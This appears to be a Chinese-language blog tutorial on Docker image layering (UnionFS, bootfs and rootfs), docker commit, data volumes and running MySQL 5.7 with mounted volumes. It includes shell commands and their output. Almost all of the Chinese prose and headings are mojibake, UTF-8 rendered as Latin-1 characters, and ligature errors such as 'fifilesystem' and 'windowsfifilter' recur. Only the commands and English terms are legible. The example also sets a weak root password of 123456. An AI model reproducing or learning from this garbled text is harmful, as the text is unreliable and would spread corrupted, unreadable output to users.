<p>UnionFSï¼ˆè”åˆæ–‡ä»¶ç³»ç»Ÿï¼‰ï¼šUnionæ–‡ä»¶ç³»ç»Ÿï¼ˆUnionFSï¼‰æ˜¯ä¸€ç§åˆ†å±‚ã€è½»é‡çº§å¹¶ä¸”é«˜æ€§èƒ½çš„æ–‡ä»¶ç³»ç»Ÿï¼Œ</p>
<p>å®ƒæ”¯æŒå¯¹æ–‡ä»¶ç³»ç»Ÿçš„ä¿®æ”¹ä½œä¸ºä¸€æ¬¡æäº¤æ¥ä¸€å±‚å±‚çš„å åŠ ï¼ŒåŒæ—¶å¯ä»¥å°†ä¸åŒç›®å½•æŒ‚è½½åˆ°åŒä¸€ä¸ªè™šæ‹Ÿæ–‡ä»¶ç³»</p>
<p>ç»Ÿä¸‹(unite several directories into a single virtual fifilesystem)ã€‚Union æ–‡ä»¶ç³»ç»Ÿæ˜¯ Docker é•œåƒçš„åŸº</p>
<p>ç¡€ã€‚é•œåƒå¯ä»¥é€šè¿‡åˆ†å±‚æ¥è¿›è¡Œç»§æ‰¿ï¼ŒåŸºäºåŸºç¡€é•œåƒï¼ˆæ²¡æœ‰çˆ¶é•œåƒï¼‰ï¼Œå¯ä»¥åˆ¶ä½œå„ç§å…·ä½“çš„åº”ç”¨é•œåƒã€‚</p>
<p>ç‰¹æ€§ï¼šä¸€æ¬¡åŒæ—¶åŠ è½½å¤šä¸ªæ–‡ä»¶ç³»ç»Ÿï¼Œä½†ä»å¤–é¢çœ‹èµ·æ¥ï¼Œåªèƒ½çœ‹åˆ°ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿï¼Œè”åˆåŠ è½½ä¼šæŠŠå„å±‚æ–‡ä»¶</p>
<p>ç³»ç»Ÿå åŠ èµ·æ¥ï¼Œè¿™æ ·æœ€ç»ˆçš„æ–‡ä»¶ç³»ç»Ÿä¼šåŒ…å«æ‰€æœ‰åº•å±‚çš„æ–‡ä»¶å’Œç›®å½•</p>
<blockquote>
<p>dockeré•œåƒåŠ è½½åŸç†</p>
</blockquote>
<p>dockerçš„é•œåƒå®é™…ä¸Šç”±ä¸€å±‚ä¸€å±‚çš„æ–‡ä»¶ç³»ç»Ÿç»„æˆï¼Œè¿™ç§å±‚çº§çš„æ–‡ä»¶ç³»ç»ŸUnionFSã€‚</p>
<p>bootfs(boot fifile system)ä¸»è¦åŒ…å«bootloaderå’Œkernel, bootloaderä¸»è¦æ˜¯å¼•å¯¼åŠ è½½kernel, Linuxåˆšå¯</p>
<p>åŠ¨æ—¶ä¼šåŠ è½½bootfsæ–‡ä»¶ç³»ç»Ÿï¼Œåœ¨Dockeré•œåƒçš„æœ€åº•å±‚æ˜¯bootfsã€‚è¿™ä¸€å±‚ä¸æˆ‘ä»¬å…¸å‹çš„Linux&#x2F;Unixç³»ç»Ÿæ˜¯</p>
<p>ä¸€æ ·çš„ï¼ŒåŒ…å«bootåŠ è½½å™¨å’Œå†…æ ¸ã€‚å½“bootåŠ è½½å®Œæˆä¹‹åæ•´ä¸ªå†…æ ¸å°±éƒ½åœ¨å†…å­˜ä¸­äº†ï¼Œæ­¤æ—¶å†…å­˜çš„ä½¿ç”¨æƒå·²</p>
<p>ç”±bootfsè½¬äº¤ç»™å†…æ ¸ï¼Œæ­¤æ—¶ç³»ç»Ÿä¹Ÿä¼šå¸è½½bootfsã€‚ </p>
<p>rootfs (root fifile system) ï¼Œåœ¨bootfsä¹‹ä¸Šã€‚åŒ…å«çš„å°±æ˜¯å…¸å‹ Linux ç³»ç»Ÿä¸­çš„ &#x2F;dev, &#x2F;proc, &#x2F;bin, &#x2F;etc ç­‰æ ‡</p>
<p>å‡†ç›®å½•å’Œæ–‡ä»¶ã€‚rootfså°±æ˜¯å„ç§ä¸åŒçš„æ“ä½œç³»ç»Ÿå‘è¡Œç‰ˆï¼Œæ¯”å¦‚Ubuntuï¼ŒCentosç­‰ç­‰ã€‚</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-22/6bbe15637a9c22909ba22cf0ea4aa6d0--89e1--image-20240922152448693.png" alt="image-20240922152448693"></p>
<p>å¹³æ—¶æˆ‘ä»¬å®‰è£…è¿›è™šæ‹Ÿæœºçš„CentOSéƒ½æ˜¯å¥½å‡ ä¸ªGï¼Œä¸ºä»€ä¹ˆDockerè¿™é‡Œæ‰200Mï¼Ÿ</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-22/bbdf1be4d587d57210e07181711d1724--2253--image-20240922152528402.png" alt="image-20240922152528402"></p>
<p>å¯¹äºä¸€ä¸ªç²¾ç®€çš„OSï¼Œrootfs å¯ä»¥å¾ˆå°ï¼Œåªéœ€è¦åŒ…å«æœ€åŸºæœ¬çš„å‘½ä»¤ï¼Œå·¥å…·å’Œç¨‹åºåº“å°±å¯ä»¥äº†ï¼Œå› ä¸ºåº•å±‚ç›´</p>
<p>æ¥ç”¨Hostçš„kernelï¼Œè‡ªå·±åªéœ€è¦æä¾›rootfså°±å¯ä»¥äº†ã€‚ç”±æ­¤å¯è§å¯¹äºä¸åŒçš„linuxå‘è¡Œç‰ˆ, bootfsåŸºæœ¬æ˜¯ä¸€</p>
<p>è‡´çš„, rootfsä¼šæœ‰å·®åˆ«, å› æ­¤ä¸åŒçš„å‘è¡Œç‰ˆå¯ä»¥å…¬ç”¨bootfsã€‚ </p>
<h2 id="3ã€åˆ†å±‚ç†è§£"><a href="#3ã€åˆ†å±‚ç†è§£" class="headerlink" title="3ã€åˆ†å±‚ç†è§£"></a>3ã€åˆ†å±‚ç†è§£</h2><p>æˆ‘ä»¬å¯ä»¥å»ä¸‹è½½ä¸€ä¸ªé•œåƒï¼Œæ³¨æ„è§‚å¯Ÿä¸‹è½½çš„æ—¥å¿—è¾“å‡ºï¼Œå¯ä»¥çœ‹åˆ°æ˜¯ä¸€å±‚ä¸€å±‚çš„åœ¨ä¸‹è½½ï¼</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker pull redis</span></span><br><span class="line">Using default tag: latest</span><br><span class="line">latest: Pulling from library/redis</span><br><span class="line">a2318d6c47ec: Pull complete </span><br><span class="line">ed7fd66f27f2: Pull complete </span><br><span class="line">410a3d5b3155: Pull complete </span><br><span class="line">9312cf3f6b3e: Pull complete </span><br><span class="line">c39877ab23d0: Pull complete </span><br><span class="line">01394ffc7248: Pull complete </span><br><span class="line">4f4fb700ef54: Pull complete </span><br><span class="line">5a03cb6163ab: Pull complete </span><br><span class="line">Digest: sha256:eadf354977d428e347d93046bb1a5569d701e8deb68f090215534a99dbcb23b9</span><br><span class="line">Status: Downloaded newer image <span class="keyword">for</span> redis:latest</span><br><span class="line">docker.io/library/redis:latest</span><br></pre></td></tr></table></figure>

<p>æ€è€ƒï¼šä¸ºä»€ä¹ˆDockeré•œåƒè¦é‡‡ç”¨è¿™ç§åˆ†å±‚çš„ç»“æ„å‘¢ï¼Ÿ</p>
<p>æœ€å¤§çš„å¥½å¤„ï¼Œæˆ‘è§‰å¾—è«è¿‡äºæ˜¯èµ„æºå…±äº«äº†ï¼æ¯”å¦‚æœ‰å¤šä¸ªé•œåƒéƒ½ä»ç›¸åŒçš„Baseé•œåƒæ„å»ºè€Œæ¥ï¼Œé‚£ä¹ˆå®¿ä¸»æœº</p>
<p>åªéœ€åœ¨ç£ç›˜ä¸Šä¿ç•™ä¸€ä»½baseé•œåƒï¼ŒåŒæ—¶å†…å­˜ä¸­ä¹Ÿåªéœ€è¦åŠ è½½ä¸€ä»½baseé•œåƒï¼Œè¿™æ ·å°±å¯ä»¥ä¸ºæ‰€æœ‰çš„å®¹å™¨æœ</p>
<p>åŠ¡äº†ï¼Œè€Œä¸”é•œåƒçš„æ¯ä¸€å±‚éƒ½å¯ä»¥è¢«å…±äº«ã€‚</p>
<p>æŸ¥çœ‹é•œåƒåˆ†å±‚çš„æ–¹å¼å¯ä»¥é€šè¿‡ <code>docker image inspect</code> å‘½ä»¤ï¼</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;RootFS&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;Type&quot;</span>: <span class="string">&quot;layers&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Layers&quot;</span>: [</span><br><span class="line">                <span class="string">&quot;sha256:8e2ab394fabf557b00041a8f080b10b4e91c7027b7c174f095332c7ebb6501cb&quot;</span>,</span><br><span class="line">                <span class="string">&quot;sha256:9a978e3d8066b448323af0ea471da443c1e9da9dd8d0663d380b6af6a5ef14ed&quot;</span>,</span><br><span class="line">                <span class="string">&quot;sha256:a64e92ee12394b08486442cb272116d6b0a4f363748434316a2e9ed2fdd379c0&quot;</span>,</span><br><span class="line">                <span class="string">&quot;sha256:40710ab1222c055362a531507662df6177a4a2c97095b5ead8389c1e5b797615&quot;</span>,</span><br><span class="line">                <span class="string">&quot;sha256:15ef09f0323042ab4d842cd2d5d53d1cdd99414ee787d08f7d7064bf69d2d146&quot;</span>,</span><br><span class="line">                <span class="string">&quot;sha256:e4dbf0bd9d9df4561e608086d426c8edca8dd2fd9b83b2bc76b4fbc88066fc1d&quot;</span>,</span><br><span class="line">                <span class="string">&quot;sha256:5f70bf18a086007016e948b04aed3b82103a36bea41755b6cddfaf10ace3c6ef&quot;</span>,</span><br><span class="line">                <span class="string">&quot;sha256:950a085c0a1cd3e27102081e4a7bfb4bd0a624325b1cd3caf71f0d5f5eced6b6&quot;</span></span><br><span class="line">            ]</span><br><span class="line">        &#125;,</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ç†è§£ï¼š</p>
<p>æ‰€æœ‰çš„ Docker é•œåƒéƒ½èµ·å§‹äºä¸€ä¸ªåŸºç¡€é•œåƒå±‚ï¼Œå½“è¿›è¡Œä¿®æ”¹æˆ–å¢åŠ æ–°çš„å†…å®¹æ—¶ï¼Œå°±ä¼šåœ¨å½“å‰é•œåƒå±‚ä¹‹</p>
<p>ä¸Šï¼Œåˆ›å»ºæ–°çš„é•œåƒå±‚ã€‚</p>
<p>ä¸¾ä¸€ä¸ªç®€å•çš„ä¾‹å­ï¼Œå‡å¦‚åŸºäº Ubuntu Linux 16.04 åˆ›å»ºä¸€ä¸ªæ–°çš„é•œåƒï¼Œè¿™å°±æ˜¯æ–°é•œåƒçš„ç¬¬ä¸€å±‚ï¼›å¦‚æœ</p>
<p>åœ¨è¯¥é•œåƒä¸­æ·»åŠ  PythonåŒ…ï¼Œå°±ä¼šåœ¨åŸºç¡€é•œåƒå±‚ä¹‹ä¸Šåˆ›å»ºç¬¬äºŒä¸ªé•œåƒå±‚ï¼›å¦‚æœç»§ç»­æ·»åŠ ä¸€ä¸ªå®‰å…¨è¡¥ä¸ï¼Œå°±</p>
<p>ä¼šåˆ›å»ºç¬¬ä¸‰ä¸ªé•œåƒå±‚ã€‚</p>
<p>è¯¥é•œåƒå½“å‰å·²ç»åŒ…å« 3 ä¸ªé•œåƒå±‚ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼ˆè¿™åªæ˜¯ä¸€ä¸ªç”¨äºæ¼”ç¤ºçš„å¾ˆç®€å•çš„ä¾‹å­ï¼‰ã€‚</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-22/f9c144e64ca90a0bb064c43099abc990--97ab--image-20240922152707544.png" alt="image-20240922152707544"></p>
<p>ä¸Šå›¾ä¸­çš„é•œåƒå±‚è·Ÿä¹‹å‰å›¾ä¸­çš„ç•¥æœ‰åŒºåˆ«ï¼Œä¸»è¦ç›®çš„æ˜¯ä¾¿äºå±•ç¤ºæ–‡ä»¶ã€‚</p>
<p>ä¸‹å›¾ä¸­å±•ç¤ºäº†ä¸€ä¸ªç¨å¾®å¤æ‚çš„ä¸‰å±‚é•œåƒï¼Œåœ¨å¤–éƒ¨çœ‹æ¥æ•´ä¸ªé•œåƒåªæœ‰ 6 ä¸ªæ–‡ä»¶ï¼Œè¿™æ˜¯å› ä¸ºæœ€ä¸Šå±‚ä¸­çš„æ–‡ä»¶</p>
<p>7 æ˜¯æ–‡ä»¶ 5 çš„ä¸€ä¸ªæ›´æ–°ç‰ˆæœ¬ã€‚</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-22/89e58c04d92f0d2023bf15fba34c7dc9--1bf4--image-20240922152716981.png" alt="image-20240922152716981"></p>
<p>è¿™ç§æƒ…å†µä¸‹ï¼Œä¸Šå±‚é•œåƒå±‚ä¸­çš„æ–‡ä»¶è¦†ç›–äº†åº•å±‚é•œåƒå±‚ä¸­çš„æ–‡ä»¶ã€‚è¿™æ ·å°±ä½¿å¾—æ–‡ä»¶çš„æ›´æ–°ç‰ˆæœ¬ä½œä¸ºä¸€ä¸ªæ–°</p>
<p>é•œåƒå±‚æ·»åŠ åˆ°é•œåƒå½“ä¸­ã€‚</p>
<p>Docker é€šè¿‡å­˜å‚¨å¼•æ“ï¼ˆæ–°ç‰ˆæœ¬é‡‡ç”¨å¿«ç…§æœºåˆ¶ï¼‰çš„æ–¹å¼æ¥å®ç°é•œåƒå±‚å †æ ˆï¼Œå¹¶ä¿è¯å¤šé•œåƒå±‚å¯¹å¤–å±•ç¤ºä¸ºç»Ÿ</p>
<p>ä¸€çš„æ–‡ä»¶ç³»ç»Ÿã€‚</p>
<p>Linux ä¸Šå¯ç”¨çš„å­˜å‚¨å¼•æ“æœ‰ AUFSã€Overlay2ã€Device Mapperã€Btrfs ä»¥åŠ ZFSã€‚é¡¾åæ€ä¹‰ï¼Œæ¯ç§å­˜å‚¨</p>
<p>å¼•æ“éƒ½åŸºäº Linux ä¸­å¯¹åº”çš„æ–‡ä»¶ç³»ç»Ÿæˆ–è€…å—è®¾å¤‡æŠ€æœ¯ï¼Œå¹¶ä¸”æ¯ç§å­˜å‚¨å¼•æ“éƒ½æœ‰å…¶ç‹¬æœ‰çš„æ€§èƒ½ç‰¹ç‚¹ã€‚</p>
<p>Docker åœ¨ Windows ä¸Šä»…æ”¯æŒ windowsfifilter ä¸€ç§å­˜å‚¨å¼•æ“ï¼Œè¯¥å¼•æ“åŸºäº NTFS æ–‡ä»¶ç³»ç»Ÿä¹‹ä¸Šå®ç°äº†åˆ†</p>
<p>å±‚å’Œ CoWã€‚</p>
<p>ä¸‹å›¾å±•ç¤ºäº†ä¸ç³»ç»Ÿæ˜¾ç¤ºç›¸åŒçš„ä¸‰å±‚é•œåƒã€‚æ‰€æœ‰é•œåƒå±‚å †å å¹¶åˆå¹¶ï¼Œå¯¹å¤–æä¾›ç»Ÿä¸€çš„è§†å›¾ã€‚</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-22/1a734a4154eeeaac48593ce23297d7ad--628f--image-20240922152734675.png" alt="image-20240922152734675"></p>
<blockquote>
<p>ç‰¹ç‚¹</p>
</blockquote>
<p>Dockeré•œåƒéƒ½æ˜¯åªè¯»çš„ï¼Œå½“å®¹å™¨å¯åŠ¨æ—¶ï¼Œä¸€ä¸ªæ–°çš„å¯å†™å±‚è¢«åŠ è½½åˆ°é•œåƒçš„é¡¶éƒ¨ï¼</p>
<p>è¿™ä¸€å±‚å°±æ˜¯æˆ‘ä»¬é€šå¸¸è¯´çš„å®¹å™¨å±‚ï¼Œå®¹å™¨ä¹‹ä¸‹çš„éƒ½å«é•œåƒå±‚ï¼</p>
<h2 id="4ã€é•œåƒcommit"><a href="#4ã€é•œåƒcommit" class="headerlink" title="4ã€é•œåƒcommit"></a>4ã€é•œåƒcommit</h2><p><strong>docker commit</strong> <strong>ä»å®¹å™¨åˆ›å»ºä¸€ä¸ªæ–°çš„é•œåƒã€‚</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker commit æäº¤å®¹å™¨å‰¯æœ¬ä½¿ä¹‹æˆä¸ºä¸€ä¸ªæ–°çš„é•œåƒï¼</span><br><span class="line"></span><br><span class="line"># è¯­æ³• </span><br><span class="line">docker commit -m=&quot;æäº¤çš„æè¿°ä¿¡æ¯&quot; -a=&quot;ä½œè€…&quot; å®¹å™¨id è¦åˆ›å»ºçš„ç›®æ ‡é•œåƒå:[æ ‡ç­¾å]</span><br></pre></td></tr></table></figure>

<p>å®é™…æ“ä½œ</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker run -it -p 3355:8080 --name tomcat01 tomcat  å¯åŠ¨tomcat</span></span><br><span class="line">root@c8e254e9555b:/usr/local/tomcat<span class="comment"># cp -r webapps.dist/* webapps   è¿›è¡Œtomcatçš„ä¿®æ”¹</span></span><br><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker commit -a=&quot;6pc1&quot; -m=&quot;add webapps tomcat&quot; c8e254e9555b mytomcat:1.0  å°†æ–°çš„å®¹å™¨æäº¤</span></span><br><span class="line">sha256:c4cc1b3de0ff0849bccb0dffa83397f0a6ff1af3a4907bca933856a5da04745a</span><br><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker images  æˆåŠŸæäº¤å¯¹åº”é•œåƒ</span></span><br><span class="line">REPOSITORY   TAG       IMAGE ID       CREATED          SIZE</span><br><span class="line">mytomcat     1.0       c4cc1b3de0ff   13 seconds ago   474MB</span><br><span class="line">tomcat       latest    7f14c7d5cf60   4 days ago       469MB</span><br><span class="line">redis        latest    590b81f2fea1   7 weeks ago      117MB</span><br><span class="line">centos       latest    5d0da3dc9764   3 years ago      231MB</span><br></pre></td></tr></table></figure>

<p>å¦‚æœä½ æƒ³è¦ä¿å­˜ä½ å½“å‰çš„çŠ¶æ€ï¼Œå¯ä»¥é€šè¿‡commitï¼Œæ¥æäº¤é•œåƒï¼Œæ–¹ä¾¿ä½¿ç”¨ï¼Œç±»ä¼¼äº VM ä¸­çš„å¿«ç…§ï¼</p>
<h1 id="ä¸ƒã€å®¹å™¨æ•°æ®å·"><a href="#ä¸ƒã€å®¹å™¨æ•°æ®å·" class="headerlink" title="ä¸ƒã€å®¹å™¨æ•°æ®å·"></a>ä¸ƒã€å®¹å™¨æ•°æ®å·</h1><h2 id="1ã€ä»€ä¹ˆæ˜¯å®¹å™¨æ•°æ®å·"><a href="#1ã€ä»€ä¹ˆæ˜¯å®¹å™¨æ•°æ®å·" class="headerlink" title="1ã€ä»€ä¹ˆæ˜¯å®¹å™¨æ•°æ®å·"></a>1ã€ä»€ä¹ˆæ˜¯å®¹å™¨æ•°æ®å·</h2><p><strong>dockerçš„ç†å¿µå›é¡¾ï¼š</strong></p>
<p>å°†åº”ç”¨å’Œè¿è¡Œçš„ç¯å¢ƒæ‰“åŒ…å½¢æˆå®¹å™¨è¿è¡Œï¼Œè¿è¡Œå¯ä»¥ä¼´éšç€å®¹å™¨ï¼Œä½†æ˜¯æˆ‘ä»¬å¯¹äºæ•°æ®çš„è¦æ±‚ï¼Œæ˜¯å¸Œæœ›èƒ½å¤Ÿ</p>
<p>æŒä¹…åŒ–çš„ï¼</p>
<p>å°±å¥½æ¯”ï¼Œä½ å®‰è£…ä¸€ä¸ªMySQLï¼Œç»“æœä½ æŠŠå®¹å™¨åˆ äº†ï¼Œå°±ç›¸å½“äºåˆ åº“è·‘è·¯äº†ï¼Œè¿™TMä¹Ÿå¤ªæ‰¯äº†å§ï¼</p>
<p>æ‰€ä»¥æˆ‘ä»¬å¸Œæœ›å®¹å™¨ä¹‹é—´æœ‰å¯èƒ½å¯ä»¥å…±äº«æ•°æ®ï¼ŒDockerå®¹å™¨äº§ç”Ÿçš„æ•°æ®ï¼Œå¦‚æœä¸é€šè¿‡docker commit ç”Ÿæˆ</p>
<p>æ–°çš„é•œåƒï¼Œä½¿å¾—æ•°æ®ä½œä¸ºé•œåƒçš„ä¸€éƒ¨åˆ†ä¿å­˜ä¸‹æ¥ï¼Œé‚£ä¹ˆå½“å®¹å™¨åˆ é™¤åï¼Œæ•°æ®è‡ªç„¶ä¹Ÿå°±æ²¡æœ‰äº†ï¼è¿™æ ·æ˜¯è¡Œ</p>
<p>ä¸é€šçš„ï¼</p>
<p>ä¸ºäº†èƒ½ä¿å­˜æ•°æ®åœ¨Dockerä¸­æˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨å·ï¼è®©æ•°æ®æŒ‚è½½åˆ°æˆ‘ä»¬æœ¬åœ°ï¼è¿™æ ·æ•°æ®å°±ä¸ä¼šå› ä¸ºå®¹å™¨åˆ é™¤</p>
<p>è€Œä¸¢å¤±äº†ï¼</p>
<p><strong>ä½œç”¨ï¼š</strong></p>
<p>å·å°±æ˜¯ç›®å½•æˆ–è€…æ–‡ä»¶ï¼Œå­˜åœ¨ä¸€ä¸ªæˆ–è€…å¤šä¸ªå®¹å™¨ä¸­ï¼Œç”±dockeræŒ‚è½½åˆ°å®¹å™¨ï¼Œä½†ä¸å±äºè”åˆæ–‡ä»¶ç³»ç»Ÿï¼Œå› æ­¤</p>
<p>èƒ½å¤Ÿç»•è¿‡ Union File System ï¼Œ æä¾›ä¸€äº›ç”¨äºæŒç»­å­˜å‚¨æˆ–å…±äº«æ•°æ®çš„ç‰¹æ€§</p>
<p>å·çš„è®¾è®¡ç›®çš„å°±æ˜¯æ•°æ®çš„æŒä¹…åŒ–ï¼Œå®Œå…¨ç‹¬ç«‹äºå®¹å™¨çš„ç”Ÿå­˜å‘¨æœŸï¼Œå› æ­¤Dockerä¸ä¼šåœ¨å®¹å™¨åˆ é™¤æ—¶åˆ é™¤å…¶æŒ‚</p>
<p>è½½çš„æ•°æ®å·</p>
<p><strong>ç‰¹ç‚¹ï¼š</strong></p>
<ol>
<li>æ•°æ®å·å¯åœ¨å®¹å™¨ä¹‹é—´å…±äº«æˆ–é‡ç”¨æ•°æ®</li>
<li>å·ä¸­çš„æ›´æ”¹å¯ä»¥ç›´æ¥ç”Ÿæ•ˆ</li>
<li>æ•°æ®å·ä¸­çš„æ›´æ”¹ä¸ä¼šåŒ…å«åœ¨é•œåƒçš„æ›´æ–°ä¸­</li>
<li>æ•°æ®å·çš„ç”Ÿå‘½å‘¨æœŸä¸€ç›´æŒç»­åˆ°æ²¡æœ‰å®¹å™¨ä½¿ç”¨å®ƒä¸ºæ­¢</li>
</ol>
<p><strong>æ‰€ä»¥ï¼šæ€»ç»“ä¸€å¥è¯ï¼š å°±æ˜¯å®¹å™¨çš„æŒä¹…åŒ–ï¼Œä»¥åŠå®¹å™¨é—´çš„ç»§æ‰¿å’Œæ•°æ®å…±äº«ï¼</strong></p>
<h2 id="2ã€ä½¿ç”¨å®¹å™¨æ•°æ®å·"><a href="#2ã€ä½¿ç”¨å®¹å™¨æ•°æ®å·" class="headerlink" title="2ã€ä½¿ç”¨å®¹å™¨æ•°æ®å·"></a>2ã€ä½¿ç”¨å®¹å™¨æ•°æ®å·</h2><blockquote>
<p>æ–¹å¼ä¸€ï¼šå®¹å™¨ä¸­ç›´æ¥ä½¿ç”¨å‘½ä»¤æ¥æ·»åŠ </p>
</blockquote>
<p>æŒ‚è½½</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">å‘½ä»¤</span><br><span class="line"><span class="comment"># docker run -it -v å®¿ä¸»æœºç»å¯¹è·¯å¾„ç›®å½•:å®¹å™¨å†…ç›®å½• é•œåƒå</span></span><br><span class="line">æµ‹è¯•</span><br><span class="line"><span class="comment"># docker run -it -v /home/test:/home centos /bin/bash</span></span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹æ•°æ®å·æ˜¯å¦æŒ‚è½½æˆåŠŸ<code>docker inspect å®¹å™¨id</code></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-22/2eba256a73aa2ce5c8c6877044c1f6d9--61d8--image-20240922162754059.png" alt="image-20240922162754059"></p>
<p>æµ‹è¯•å®¹å™¨å’Œå®¿ä¸»æœºä¹‹é—´æ•°æ®å…±äº«ï¼šå¯ä»¥å‘ç°ï¼Œåœ¨å®¹å™¨ä¸­ï¼Œåˆ›å»ºçš„ä¼šåœ¨å®¿ä¸»æœºä¸­çœ‹åˆ°ï¼</p>
<p>æµ‹è¯•å®¹å™¨åœæ­¢é€€å‡ºåï¼Œä¸»æœºä¿®æ”¹æ•°æ®æ˜¯å¦ä¼šåŒæ­¥ï¼</p>
<ol>
<li>åœæ­¢å®¹å™¨</li>
<li>åœ¨å®¿ä¸»æœºä¸Šä¿®æ”¹æ–‡ä»¶</li>
<li>å¯åŠ¨åˆšæ‰åœæ­¢çš„å®¹å™¨</li>
<li>ç„¶åæŸ¥çœ‹å¯¹åº”çš„æ–‡ä»¶ï¼Œå‘ç°æ•°æ®ä¾æ—§åŒæ­¥</li>
</ol>
<blockquote>
<p>å®æˆ˜ï¼šä½¿ç”¨dockerå®‰è£…mysql</p>
</blockquote>
<p>æ€è€ƒï¼šmysql æ•°æ®æŒä¹…åŒ–çš„é—®é¢˜ï¼</p>
<ol>
<li><p>ä¸‹è½½é•œåƒ</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker pull mysql:5.7</span></span><br><span class="line">5.7: Pulling from library/mysql</span><br><span class="line">20e4dcae4c69: Pull complete </span><br><span class="line">1c56c3d4ce74: Pull complete </span><br><span class="line">e9f03a1c24ce: Pull complete </span><br><span class="line">68c3898c2015: Pull complete </span><br><span class="line">6b95a940e7b6: Pull complete </span><br><span class="line">90986bb8de6e: Pull complete </span><br><span class="line">ae71319cb779: Pull complete </span><br><span class="line">ffc89e9dfd88: Pull complete </span><br><span class="line">43d05e938198: Pull complete </span><br><span class="line">064b2d298fba: Pull complete </span><br><span class="line">df9a4d85569b: Pull complete </span><br><span class="line">Digest: sha256:4bc6bc963e6d8443453676cae56536f4b8156d78bae03c0145cbe47c2aad73bb</span><br><span class="line">Status: Downloaded newer image <span class="keyword">for</span> mysql:5.7</span><br><span class="line">docker.io/library/mysql:5.7	</span><br></pre></td></tr></table></figure>
</li>
<li><p>å¯åŠ¨å®¹å™¨</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker run -d -p 3310:3306 -v /home/mysql/conf:/etc/mysql/conf.d -v /home/mysql/data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 --name mysql01 mysql:5.7</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>å¯ä»¥æˆåŠŸåŒæ­¥å¯¹åº”çš„ä¿¡æ¯ï¼Œä½¿ç”¨mysqlè¿æ¥å·¥å…·å°±å¯ä»¥å˜ç›¸ç›´æ¥æ§åˆ¶dockerå†…çš„æ•°æ®åº“äº†</p>
</li>
</ol>
<p><code>docker run -d -p 3310:3306 -v /home/mysql/conf:/etc/mysql/conf.d -v /home/mysql/data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 --name mysql01 mysql:5.7</code>å‘½åè§£é‡Š</p>
<p>è¿™ä¸ªå‘½ä»¤ä½¿ç”¨ Docker è¿è¡Œ MySQL 5.7 å®¹å™¨ï¼Œå¹¶åšå‡ºä»¥ä¸‹é…ç½®ï¼š</p>
<ul>
<li><code>-d</code> è¡¨ç¤ºå®¹å™¨åœ¨åå°è¿è¡Œï¼ˆå³â€œå®ˆæŠ¤è¿›ç¨‹â€æ¨¡å¼ï¼‰ã€‚</li>
<li><code>-p 3310:3306</code> å°†å®¹å™¨å†…çš„ MySQL ç«¯å£ 3306 æ˜ å°„åˆ°ä¸»æœºçš„ç«¯å£ 3310 ä¸Šï¼Œè¿™æ ·ä½ å°±å¯ä»¥é€šè¿‡ä¸»æœºä¸Šçš„ç«¯å£ 3310 è®¿é—® MySQL æœåŠ¡ã€‚</li>
<li><code>-v /home/mysql/conf:/etc/mysql/conf.d</code> å°†ä¸»æœºä¸Šçš„ç›®å½• <code>/home/mysql/conf</code> æŒ‚è½½åˆ°å®¹å™¨çš„ <code>/etc/mysql/conf.d</code> ç›®å½•ä¸­ï¼Œè¿™æ ·ä½ å¯ä»¥åœ¨ä¸»æœºä¸Šç¼–è¾‘ MySQL é…ç½®æ–‡ä»¶ï¼Œå¹¶ä¸”å®ƒä»¬ä¼šåœ¨å®¹å™¨å†…ç”Ÿæ•ˆã€‚</li>
<li><code>-v /home/mysql/data:/var/lib/mysql</code> å°†ä¸»æœºä¸Šçš„ç›®å½• <code>/home/mysql/data</code> æŒ‚è½½åˆ°å®¹å™¨çš„ <code>/var/lib/mysql</code> ç›®å½•ä¸­ï¼Œè¿™æ ·ä½ å¯ä»¥åœ¨ä¸»æœºä¸Šä¿å­˜ MySQL æ•°æ®æ–‡ä»¶ï¼Œå¹¶ä¸”å®ƒä»¬ä¼šåœ¨å®¹å™¨å†…ç”Ÿæ•ˆã€‚</li>
<li><code>-e MYSQL_ROOT_PASSWORD=123456</code> è®¾ç½® MySQL root ç”¨æˆ·çš„å¯†ç ä¸º <code>123456</code>ã€‚</li>
<li><code>--name mysql01</code> æŒ‡å®šå®¹å™¨çš„åç§°ä¸º <code>mysql01</code>ï¼Œä»¥ä¾¿äºç®¡ç†å’ŒæŸ¥æ‰¾ã€‚</li>
<li><code>mysql:5.7</code> æŒ‡å®šä½¿ç”¨å®˜æ–¹æä¾›çš„ MySQL 5.7 é•œåƒã€‚</li>
</ul>
